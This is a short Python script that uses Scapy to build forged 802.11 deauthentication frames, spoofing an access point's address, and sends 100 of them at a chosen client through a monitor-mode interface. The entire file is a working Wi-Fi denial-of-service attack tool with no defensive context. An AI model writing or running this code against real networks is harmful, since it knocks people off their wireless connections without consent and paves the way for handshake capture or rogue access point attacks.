from scapy.all import *
from scapy.layers.dot11 import Dot11Deauth,Dot11,RadioTap
import logging

logging.basicConfig(level=logging.INFO)

def deauth_attack(target_mac, ap_mac, iface="wlan0mon"):
    packet = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
    logging.info(f"Sending Deauth packets to {target_mac} from {ap_mac}")
    sendp(packet, iface=iface, count=100, inter=0.1)